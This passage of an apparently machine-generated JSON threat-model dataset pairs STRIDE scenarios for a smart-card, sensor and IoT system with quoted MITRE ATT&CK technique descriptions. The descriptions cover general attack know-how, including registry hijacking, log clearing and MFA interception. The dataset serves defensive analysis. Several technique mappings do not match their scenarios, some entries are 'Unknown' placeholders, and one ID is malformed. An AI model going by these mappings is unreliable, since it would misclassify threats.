                "communication channels",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses smart card emulation to gain unauthorized access to the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the capability to emulate a smart card.",
                    "Role": "Attacker",
                    "Condition": "Access to smart card cloning technology."
                },
                {
                    "Assumption": "The smart card reader device does not perform robust checks.",
                    "Role": "System",
                    "Condition": "Using outdated or vulnerable smart card reader devices."
                },
                {
                    "Assumption": "The legitimate user's smart card data is compromised.",
                    "Role": "User",
                    "Condition": "Smart card data leakage."
                }
            ],
            "Potential Impact": "Unauthorized entry and potential data theft from the system.",
            "MITRE ATT&CK Keywords": [
                "smart card emulation",
                "access control",
                "physical security",
                "device spoofing"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the data collected by sensors to disrupt system decision-making.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and alter sensor signals.",
                    "Role": "Attacker",
                    "Condition": "Sensor signals are transmitted over an unsecured medium."
                },
                {
                    "Assumption": "The system does not validate sensor data integrity before processing.",
                    "Role": "System",
                    "Condition": "Lack of integrity checks for sensor data."
                },
                {
                    "Assumption": "The attacker has access to the physical or network environment.",
                    "Role": "Attacker",
                    "Condition": "Presence within the proximity of sensors or network nodes."
                }
            ],
            "Potential Impact": "Compromise system integrity, leading to erroneous decisions and actions.",
            "MITRE ATT&CK Keywords": [
                "sensor tampering",
                "data integrity",
                "signal interception",
                "network security"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the database and alters user profiles and system configuration data.",
            "Assumptions": [
                {
                    "Assumption": "Database access control is weak or misconfigured.",
                    "Role": "System",
                    "Condition": "Using default or easily guessable credentials."
                },
                {
                    "Assumption": "The attacker has knowledge of database systems and structures.",
                    "Role": "Attacker",
                    "Condition": "Possessing technical expertise or insider knowledge."
                },
                {
                    "Assumption": "The system lacks robust auditing and anomaly detection mechanisms.",
                    "Role": "System",
                    "Condition": "No active monitoring for sudden changes or unauthorized accesses."
                }
            ],
            "Potential Impact": "Corruption of essential system data and disruption of personalized services.",
            "MITRE ATT&CK Keywords": [
                "database tampering",
                "access control",
                "configuration data",
                "user profiles"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker uses malware to alter the machine learning models used in the system.",
            "Assumptions": [
                {
                    "Assumption": "The machine learning models are accessible and can be altered.",
                    "Role": "Attacker",
                    "Condition": "Lack of proper access restrictions for ML model storage."
                },
                {
                    "Assumption": "The system does not verify the integrity of models before deployment.",
                    "Role": "System",
                    "Condition": "No checksum or hash verification for models."
                },
                {
                    "Assumption": "The attacker can deploy malware to the system.",
                    "Role": "Attacker",
                    "Condition": "Ability to exploit known software vulnerabilities."
                }
            ],
            "Potential Impact": "Manipulation of system behavior and degradation of service quality.",
            "MITRE ATT&CK Keywords": [
                "model poisoning",
                "data integrity",
                "malware injection",
                "AI/ML"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies unauthorized actions performed using their credentials.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks adequate logging and auditing capabilities.",
                    "Role": "System",
                    "Condition": "No detailed record of user activities maintained."
                },
                {
                    "Assumption": "The authentication logs are not securely stored.",
                    "Role": "System",
                    "Condition": "Logs can be tampered with or deleted."
                },
                {
                    "Assumption": "User credentials can be compromised.",
                    "Role": "Attacker",
                    "Condition": "Weak or reused passwords, phishing attacks."
                }
            ],
            "Potential Impact": "Difficulty in attributing actions, potential access disputes.",
            "MITRE ATT&CK Keywords": [
                "user repudiation",
                "logging",
                "credential theft",
                "audit trails"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes traces of unauthorized access from system logs.",
            "Assumptions": [
                {
                    "Assumption": "System logs are stored in a location accessible to the attacker.",
                    "Role": "System",
                    "Condition": "Logs are not adequately protected."
                },
                {
                    "Assumption": "The attacker has sufficient permissions to delete or alter logs.",
                    "Role": "Attacker",
                    "Condition": "Elevated privileges obtained through exploit."
                },
                {
                    "Assumption": "No real-time monitoring or alerting on log integrity.",
                    "Role": "System",
                    "Condition": "Lack of integrity checks on log files."
                }
            ],
            "Potential Impact": "Hindrance to forensic analysis and incident response activities.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "repudiation",
                "incident response",
                "forensics"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user claims that actions taken by compromised smart card were not authorized.",
            "Assumptions": [
                {
                    "Assumption": "Smart card transactions are not properly logged.",
                    "Role": "System",
                    "Condition": "Inadequate transaction logging for smart card activities."
                },
                {
                    "Assumption": "Logs do not capture enough detail to identify the origin.",
                    "Role": "System",
                    "Condition": "Logs lack contextual information such as location, time, and user identity."
                },
                {
                    "Assumption": "Smart card can be cloned or emulated.",
                    "Role": "Attacker",
                    "Condition": "Availability of cloning tools and techniques."
                }
            ],
            "Potential Impact": "Challenges in dispute resolution and proving actions were unauthorized.",
            "MITRE ATT&CK Keywords": [
                "transaction logging",
                "smart card",
                "repudiation",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Multi-Factor Authentication Interception",
                "description": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users\u2019 phones.(Citation: Okta Scatter Swine 2022)",
                "id": "attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49",
                "technique_id": "T1111"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data, such as biometric information, is leaked from insecure data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Data repositories lack adequate encryption for stored data.",
                    "Role": "System",
                    "Condition": "Use of plaintext or weak encryption schemes."
                },
                {
                    "Assumption": "Access controls on data repositories are poorly managed.",
                    "Role": "System",
                    "Condition": "Insufficient role-based access controls."
                },
                {
                    "Assumption": "Attacker can exploit vulnerabilities to access data repositories.",
                    "Role": "Attacker",
                    "Condition": "Exploitation of known system or software vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive personal information.",
            "MITRE ATT&CK Keywords": [
                "data leakage",
                "biometric data",
                "encryption",
                "access control"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unsecured communication channels lead to data interception by an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted in an unencrypted format.",
                    "Role": "System",
                    "Condition": "Use of non-secure communication protocols."
                },
                {
                    "Assumption": "The network infrastructure is accessible to the attacker.",
                    "Role": "Attacker",
                    "Condition": "Attacker within proximity of network nodes or capable of network interception."
                },
                {
                    "Assumption": "Lack of integrity and confidentiality measures.",
                    "Role": "System",
                    "Condition": "No use of TLS/SSL or other security measures."
                }
            ],
            "Potential Impact": "Exposure of sensitive data and eavesdropping on user activities.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted communication",
                "network security",
                "eavesdropping"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Malicious software installed on user devices exfiltrates sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "User devices have insufficient malware detection or prevention.",
                    "Role": "User",
                    "Condition": "Lack of updated antivirus/antimalware solutions."
                },
                {
                    "Assumption": "Users may unknowingly install malicious software.",
                    "Role": "User",
                    "Condition": "Phishing attacks or malicious downloads."
                },
                {
                    "Assumption": "The system does not monitor outgoing data traffic effectively.",
                    "Role": "System",
                    "Condition": "Absence of data loss prevention (DLP) mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized leakage of sensitive personal and system data.",
            "MITRE ATT&CK Keywords": [
                "data exfiltration",
                "malware",
                "user device",
                "phishing"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the communication network, causing legitimate data to be dropped or delayed.",
            "Assumptions": [
                {
                    "Assumption": "The network infrastructure lacks adequate traffic control mechanisms.",
                    "Role": "System",
                    "Condition": "No implementation of rate-limiting or anti-DDoS solutions."
                },
                {
                    "Assumption": "The attacker has access to a large number of botnets.",
                    "Role": "Attacker",
                    "Condition": "Control over multiple compromised devices."
                },
                {
                    "Assumption": "The network is critical for real-time system operations.",
                    "Role": "System",
                    "Condition": "Dependence on continuous network uptime and integrity."
                }
            ],
            "Potential Impact": "Disruption of system functionality and degraded service performance.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network flood",
                "service disruption",
                "botnet"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker physically disables or destroys critical actuators in the system.",
            "Assumptions": [
                {
                    "Assumption": "Actuators are physically accessible and unprotected.",
                    "Role": "System",
                    "Condition": "No physical security measures for critical components."
                },
                {
                    "Assumption": "The attacker can bypass any existing physical security.",
                    "Role": "Attacker",
                    "Condition": "Ability to evade or disable security systems."
                },
                {
                    "Assumption": "Critical actuators are essential for system operation.",
                    "Role": "System",
                    "Condition": "Dependence on uninterrupted actuator function for services."
                }
            ],
            "Potential Impact": "Inability to perform key actions, compromising system effectiveness.",
            "MITRE ATT&CK Keywords": [
                "physical disruption",
                "actuator",
                "service interruption",
                "component damage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware installed on user devices to continuously request system resources, overloading the system.",
            "Assumptions": [
                {
                    "Assumption": "Malware can run and execute processes on user devices.",
                    "Role": "Attacker",
                    "Condition": "Insufficient malware protections in place."
                },
                {
                    "Assumption": "User devices are integral to system performance.",
                    "Role": "User",
                    "Condition": "Dependence on user devices for key functions."
                },
                {
                    "Assumption": "The system lacks adequate performance monitoring and prevention capabilities.",
                    "Role": "System",
                    "Condition": "No real-time monitoring for unusual resource usage."
                }
            ],
            "Potential Impact": "Service degradation and potential system crashes.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "malware",
                "DoS",
                "user device"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability to gain administrative privileges on the system.",
            "Assumptions": [
                {
                    "Assumption": "The system has unpatched or outdated software with known vulnerabilities.",
                    "Role": "System",
                    "Condition": "Delayed updates and patch management."
                },
                {
                    "Assumption": "The attacker has knowledge of the exploit and system architecture.",
                    "Role": "Attacker",
                    "Condition": "Access to exploit tools and system documentation."
                },
                {
                    "Assumption": "No effective privilege separation exists within the system.",
                    "Role": "System",
                    "Condition": "Lack of least privilege enforcement."
                }
            ],
            "Potential Impact": "Unauthorized actions and full system control by the attacker.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "software vulnerability",
                "administrative access",
                "exploit"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--02bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a compromised user account with elevated permissions to modify system settings.",
            "Assumptions": [
                {
                    "Assumption": "User accounts with elevated permissions can be compromised.",
                    "Role": "System",
                    "Condition": "Weak password policies or phishing incidents."
                },
                {
                    "Assumption": "Insufficient monitoring of privileged account activities.",
                    "Role": "System",
                    "Condition": "Lack of real-time alerting and auditing for high-risk accounts."
                },
                {
                    "Assumption": "System configuration settings are not adequately protected.",
                    "Role": "System",
                    "Condition": "No multi-factor authentication or additional verification for critical changes."
                }
            ],
            "Potential Impact": "Modification of system behavior, potentially leading to security breaches and service degradation.",
            "MITRE ATT&CK Keywords": [
                "account takeover",
                "privileged user",
                "system configuration",
                "phishing"
            ],
            "mitre_technique": {
                "name": "Application Access Token",
                "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
                "id": "attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a",
                "technique_id": "T1527"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "By exploiting vulnerabilities in the IoT devices, an attacker gains control over the entire network.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices have known vulnerabilities that can be exploited remotely.",
                    "Role": "Attacker",
                    "Condition": "Delayed updates and insufficient security patches."
                },
                {
                    "Assumption": "The attacker has the capability to scan and identify vulnerable IoT devices.",
                    "Role": "Attacker",
                    "Condition": "Access to network scanning tools and techniques."
                },
                {
                    "Assumption": "No effective network segmentation or isolation for IoT devices.",
                    "Role": "System",
                    "Condition": "All devices are on the same network without segregation."
                }
            ],
            "Potential Impact": "Complete control over networked IoT devices and potential for large-scale security incidents.",
            "MITRE ATT&CK Keywords": [
                "network takeover",
                "IoT exploitation",
                "remote access",
                "vulnerability scanning"
            ],
            "mitre_technique": {
                "name": "Vulnerability Scanning",
                "description": "Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
                "id": "attack-pattern--5502c4e9-24ef-4d5f-8ee9-9e906c2f82c4",
                "technique_id": "T1595.002"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "24",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses fake credentials to impersonate a legitimate user and gain access to the system through a smartphone interface.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of legitimate user credentials.",
                    "Role": "Attacker",
                    "Condition": "Credentials must be compromised through phishing or data breach."
                },
                {
                    "Assumption": "The user interface allows for credential-based login.",
                    "Role": "System Designer",
                    "Condition": "Login methods like passwords, pins, or smart cards are in use."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and potential tampering with system configurations.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "credential theft",
                "user interface",
                "login"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious actor uses a cloned smart card to falsely authenticate as a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "Smart card cloning methods are known to the attacker.",
                    "Role": "Attacker",
                    "Condition": "Access to the physical smart card for cloning."
                },
                {
                    "Assumption": "The authentication system accepts smart card credentials without additional validation.",
                    "Role": "System Designer",
                    "Condition": "Sole reliance on smart cards for authentication."
                }
            ],
            "Potential Impact": "Unauthorized physical access to secure areas and alteration of system settings through actuators.",
            "MITRE ATT&CK Keywords": [
                "smart card cloning",
                "physical access",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Pluggable Authentication Modules",
